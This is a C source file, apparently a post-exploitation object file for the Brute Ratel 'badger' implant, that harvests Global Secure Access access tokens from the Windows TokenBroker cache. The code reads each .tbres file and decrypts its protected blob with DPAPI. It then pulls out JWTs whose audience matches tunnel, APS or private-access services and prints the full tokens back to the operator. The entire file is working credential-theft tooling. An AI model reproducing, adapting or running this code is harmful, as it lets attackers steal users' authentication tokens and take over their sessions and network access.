#include <windows.h>
#include <stdio.h>
#include "badger_exports.h"

DECLSPEC_IMPORT DWORD Kernel32$GetLastError();
DECLSPEC_IMPORT BOOL Kernel32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL Kernel32$FindClose(HANDLE hFindFile);
DECLSPEC_IMPORT BOOL Kernel32$FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
DECLSPEC_IMPORT HANDLE Kernel32$FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
DECLSPEC_IMPORT DWORD Kernel32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
DECLSPEC_IMPORT BOOL Kernel32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT HANDLE Kernel32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT DWORD Kernel32$GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
DECLSPEC_IMPORT HLOCAL Kernel32$LocalFree(HLOCAL hMem);

DECLSPEC_IMPORT BOOL Crypt32$CryptUnprotectData(DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, PVOID pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);

DECLSPEC_IMPORT int Msvcrt$sprintf(char *buffer, const char *format, ...);
DECLSPEC_IMPORT char *Msvcrt$strstr(const char *haystack, const char *needle);

#define MAX_JWT_LEN     8192
#define MAX_TOKENS      16
#define MAX_FILE_SIZE   (512 * 1024)
#define B64_DECODE_MAX  4096

typedef struct _GsaToken {
    char type[24];
    char audience[80];
    char scope[128];
    char source[MAX_PATH];
    DWORD expiry;
    int len;
    char jwt[MAX_JWT_LEN];
} GsaToken;

static GsaToken g_found[MAX_TOKENS];
static int g_count = 0;

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *in, int inLen, unsigned char *out, int outMax) {
    int j = 0;
    unsigned int acc = 0;
    int bits = 0;
    for (int i = 0; i < inLen && j < outMax; i++) {
        if (in[i] == '=' || in[i] == '\0') break;
        int v = b64_val(in[i]);
        if (v < 0) continue;
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[j++] = (unsigned char)((acc >> bits) & 0xFF);
        }
    }
    return j;
}

/* --- Base64url decode (for JWT payload) --- */
static int b64url_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '-' || c == '+') return 62;
    if (c == '_' || c == '/') return 63;
    return -1;
}

static int b64url_decode(const char *in, int inLen, char *out, int outMax) {
    int j = 0;
    unsigned int acc = 0;
    int bits = 0;
    for (int i = 0; i < inLen && j < outMax - 1; i++) {
        if (in[i] == '=' || in[i] == '\0') break;
        int v = b64url_val(in[i]);
        if (v < 0) continue;
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[j++] = (char)((acc >> bits) & 0xFF);
        }
    }
    out[j] = '\0';
    return j;
}

static int IsJwtChar(unsigned char c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '-' || c == '_' ||
           c == '.' || c == '+' || c == '/';
}

static void ExtractField(const char *json, const char *field, char *out, int outMax) {
    out[0] = '\0';
    char key[64];
    int kl = 0;
    key[kl++] = '"';
    for (int i = 0; field[i] && kl < 60; i++) key[kl++] = field[i];
    key[kl++] = '"';
    key[kl++] = ':';
    key[kl] = '\0';

    const char *p = Msvcrt$strstr(json, key);
    if (!p) return;
    p += kl;
    while (*p == ' ' || *p == '\t') p++;

    if (*p == '"') {
        p++;
        int i = 0;
        while (*p && *p != '"' && i < outMax - 1) out[i++] = *p++;
        out[i] = '\0';
    } else {
        int i = 0;
        while (*p && *p != ',' && *p != '}' && *p != ' ' && i < outMax - 1) out[i++] = *p++;
        out[i] = '\0';
    }
}

static const char *IdentifyGsaToken(const char *aud) {
    if (Msvcrt$strstr(aud, "e92b9b37")) return "TUNNEL";
    if (Msvcrt$strstr(aud, "b3fa0115")) return "APS";
    if (Msvcrt$strstr(aud, "79486f61")) return "PORTO";
    return NULL;
}

static int IsDuplicate(const char *aud, DWORD exp) {
    for (int i = 0; i < g_count; i++) {
        if (BadgerStrcmp(g_found[i].audience, aud) == 0 && g_found[i].expiry == exp)
            return 1;
    }
    return 0;
}

static void TryAddJwt(const char *jwt, int jwtLen, const char *source) {
    if (g_count >= MAX_TOKENS) return;
    if (jwtLen < 100 || jwtLen >= MAX_JWT_LEN) return;

    int dot1 = -1, dot2 = -1, dots = 0;
    for (int i = 0; i < jwtLen; i++) {
        if (jwt[i] == '.') {
            dots++;
            if (dots == 1) dot1 = i;
            if (dots == 2) dot2 = i;
        }
    }
    if (dots < 2 || dot1 < 0 || dot2 <= dot1 + 1) return;

    int payloadLen = dot2 - dot1 - 1;
    if (payloadLen > B64_DECODE_MAX - 1) return;

    char *decoded = BadgerAlloc(B64_DECODE_MAX);
    if (!decoded) return;

    int dLen = b64url_decode(jwt + dot1 + 1, payloadLen, decoded, B64_DECODE_MAX);
    if (dLen < 10 || decoded[0] != '{') {
        BadgerFree((PVOID *)&decoded);
        return;
    }

    char aud[80];
    ExtractField(decoded, "aud", aud, sizeof(aud));

    const char *type = IdentifyGsaToken(aud);
    if (!type) {
        BadgerFree((PVOID *)&decoded);
        return;
    }

    char expStr[32];
    ExtractField(decoded, "exp", expStr, sizeof(expStr));
    DWORD exp = (DWORD)BadgerAtoi(expStr);

    if (IsDuplicate(aud, exp)) {
        BadgerFree((PVOID *)&decoded);
        return;
    }

    GsaToken *t = &g_found[g_count];
    BadgerMemset(t, 0, sizeof(GsaToken));

    int tl = BadgerStrlen((char *)type);
    BadgerMemcpy(t->type, type, tl < 23 ? tl : 23);

    int al = BadgerStrlen(aud);
    BadgerMemcpy(t->audience, aud, al < 79 ? al : 79);

    ExtractField(decoded, "scp", t->scope, sizeof(t->scope));
    t->expiry = exp;

    int sl = BadgerStrlen((char *)source);
    BadgerMemcpy(t->source, source, sl < MAX_PATH - 1 ? sl : MAX_PATH - 1);

    t->len = jwtLen < MAX_JWT_LEN - 1 ? jwtLen : MAX_JWT_LEN - 1;
    BadgerMemcpy(t->jwt, jwt, t->len);

    g_count++;
    BadgerFree((PVOID *)&decoded);
}

static void ScanBufferForJwts(const unsigned char *data, DWORD dataLen, const char *source) {
    for (DWORD i = 0; i + 3 < dataLen; i++) {
        if (data[i] != 'e' || data[i + 1] != 'y' || data[i + 2] != 'J')
            continue;

        int jwtLen = 0;
        while (i + jwtLen < dataLen && jwtLen < MAX_JWT_LEN - 1 && IsJwtChar(data[i + jwtLen]))
            jwtLen++;

        if (jwtLen < 100) continue;

        char *jwt = BadgerAlloc(jwtLen + 1);
        if (!jwt) continue;
        BadgerMemcpy(jwt, data + i, jwtLen);
        jwt[jwtLen] = '\0';
        TryAddJwt(jwt, jwtLen, source);
        BadgerFree((PVOID *)&jwt);

        i += jwtLen - 1;
    }
}

static char *Utf16ToNarrow(const unsigned char *data, DWORD dataLen, DWORD *outLen) {
    DWORD narrowLen = 0;
    for (DWORD i = 0; i < dataLen; i++) {
        if (data[i] != 0) narrowLen++;
    }

    char *narrow = BadgerAlloc(narrowLen + 1);
    if (!narrow) return NULL;

    DWORD j = 0;
    for (DWORD i = 0; i < dataLen; i++) {
        if (data[i] != 0) narrow[j++] = (char)data[i];
    }
    narrow[j] = '\0';
    *outLen = j;
    return narrow;
}

static int IsUtf16LE(const unsigned char *data, DWORD dataLen) {
    if (dataLen < 4) return 0;
    if (data[0] == 0xFF && data[1] == 0xFE) return 1;
    if (data[1] == 0x00 && data[3] == 0x00) return 1;
    return 0;
}

static const char *FindResponseBytesValue(const char *narrow, DWORD narrowLen, int *b64Len) {
    const char *marker = "IsProtected\":true,\"Value\":\"";
    const char *p = Msvcrt$strstr(narrow, marker);
    if (!p) {
        marker = "IsProtected\": true, \"Value\": \"";
        p = Msvcrt$strstr(narrow, marker);
    }
    if (!p) {
        marker = "IsProtected\":true,\"Value\": \"";
        p = Msvcrt$strstr(narrow, marker);
    }
    if (!p) return NULL;

    int mlen = BadgerStrlen((char *)marker);
    const char *start = p + mlen;

    int len = 0;
    while (start[len] && start[len] != '"') len++;

    if (len < 16) return NULL;
    *b64Len = len;
    return start;
}

static void ProcessFile(const char *filePath, WCHAR **dispatch) {
    HANDLE hFile = Kernel32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD fileSize = Kernel32$GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > MAX_FILE_SIZE) {
        Kernel32$CloseHandle(hFile);
        return;
    }

    unsigned char *data = BadgerAlloc(fileSize);
    if (!data) { Kernel32$CloseHandle(hFile); return; }

    DWORD bytesRead;
    if (!Kernel32$ReadFile(hFile, data, fileSize, &bytesRead, NULL)) {
        BadgerFree((PVOID *)&data);
        Kernel32$CloseHandle(hFile);
        return;
    }
    Kernel32$CloseHandle(hFile);

    int before = g_count;

    DWORD narrowLen = 0;
    char *narrow = NULL;

    if (IsUtf16LE(data, bytesRead)) {
        narrow = Utf16ToNarrow(data, bytesRead, &narrowLen);
    } else {
        narrowLen = bytesRead;
        narrow = BadgerAlloc(bytesRead + 1);
        if (narrow) {
            BadgerMemcpy(narrow, data, bytesRead);
            narrow[bytesRead] = '\0';
        }
    }

    BadgerFree((PVOID *)&data);
    if (!narrow) return;

    int b64Len = 0;
    const char *b64Str = FindResponseBytesValue(narrow, narrowLen, &b64Len);

    if (b64Str && b64Len > 0) {
        int maxDecoded = (b64Len * 3) / 4 + 16;
        if (maxDecoded > MAX_FILE_SIZE) maxDecoded = MAX_FILE_SIZE;

        unsigned char *dpapiBlob = BadgerAlloc(maxDecoded);
        if (dpapiBlob) {
            int blobLen = b64_decode(b64Str, b64Len, dpapiBlob, maxDecoded);

            if (blobLen >= 64) {
                DATA_BLOB dataIn, dataOut;
                dataIn.pbData = dpapiBlob;
                dataIn.cbData = (DWORD)blobLen;
                BadgerMemset(&dataOut, 0, sizeof(DATA_BLOB));

                if (Crypt32$CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
                    BadgerDispatch(dispatch, "[*] DPAPI decrypt OK: %s (%lu bytes)\n",
                        filePath, dataOut.cbData);
                    ScanBufferForJwts(dataOut.pbData, dataOut.cbData, filePath);
                    Kernel32$LocalFree(dataOut.pbData);
                } else {
                    BadgerDispatch(dispatch, "[!] DPAPI decrypt failed: %s (err=%lu)\n",
                        filePath, Kernel32$GetLastError());
                }
            }
            BadgerFree((PVOID *)&dpapiBlob);
        }
    }

    ScanBufferForJwts((const unsigned char *)narrow, narrowLen, filePath);

    int found = g_count - before;
    if (found > 0)
        BadgerDispatch(dispatch, "[+] %s -> %d GSA token(s)\n", filePath, found);

    BadgerFree((PVOID *)&narrow);
}

static void ScanDirectory(const char *dir, const char *pattern, WCHAR **dispatch) {
    char searchPath[MAX_PATH];
    Msvcrt$sprintf(searchPath, "%s\\%s", dir, pattern);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = Kernel32$FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    int count = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        char fullPath[MAX_PATH];
        Msvcrt$sprintf(fullPath, "%s\\%s", dir, fd.cFileName);
        ProcessFile(fullPath, dispatch);
        count++;
    } while (Kernel32$FindNextFileA(hFind, &fd));

    Kernel32$FindClose(hFind);
    BadgerDispatch(dispatch, "[*] Scanned %d file(s) in %s\n", count, dir);
}

void coffee(char **argv, int argc, WCHAR **dispatch) {
    g_dispatch = dispatch;
    g_count = 0;
    BadgerMemset(g_found, 0, sizeof(g_found));

    BadgerDispatch(dispatch, "============================================\n");
    BadgerDispatch(dispatch, "  GSA Token Extraction from TokenBroker\n");
    BadgerDispatch(dispatch, "============================================\n\n");

    char userProfile[MAX_PATH];
    if (Kernel32$GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH) == 0) {
        BadgerDispatch(dispatch, "[-] Cannot resolve %%USERPROFILE%%\n");
        return;
    }

    char dir[MAX_PATH];

    Msvcrt$sprintf(dir, "%s\\AppData\\Local\\Microsoft\\TokenBroker\\Cache", userProfile);
    BadgerDispatch(dispatch, "[*] Scanning: %s\n", dir);
    ScanDirectory(dir, "*.tbres", dispatch);

    BadgerDispatch(dispatch, "\n============================================\n");
    BadgerDispatch(dispatch, "  RESULTS: %d GSA token(s) extracted\n", g_count);
    BadgerDispatch(dispatch, "============================================\n\n");

    if (g_count == 0) {
        BadgerDispatch(dispatch, "[-] No GSA tokens found in TokenBroker cache\n");
        BadgerDispatch(dispatch, "[*] Possible causes:\n");
        BadgerDispatch(dispatch, "    - No GSA enrollment on this device\n");
        BadgerDispatch(dispatch, "    - Tokens expired and purged\n");
        BadgerDispatch(dispatch, "    - DPAPI decrypt failed (wrong user context)\n");
        return;
    }

    for (int i = 0; i < g_count; i++) {
        GsaToken *t = &g_found[i];
        BadgerDispatch(dispatch, "--- %s TOKEN ---\n", t->type);
        BadgerDispatch(dispatch, "Audience: %s\n", t->audience);
        BadgerDispatch(dispatch, "Scope:    %s\n", t->scope[0] ? t->scope : "N/A");
        BadgerDispatch(dispatch, "Expiry:   %lu\n", t->expiry);
        BadgerDispatch(dispatch, "Source:   %s\n", t->source);
        BadgerDispatch(dispatch, "JWT:\n");

        int off = 0;
        while (off < t->len) {
            int chunk = t->len - off;
            if (chunk > 200) chunk = 200;
            char buf[204];
            BadgerMemcpy(buf, t->jwt + off, chunk);
            buf[chunk] = '\0';
            BadgerDispatch(dispatch, "%s\n", buf);
            off += chunk;
        }
        BadgerDispatch(dispatch, "\n");
    }
}
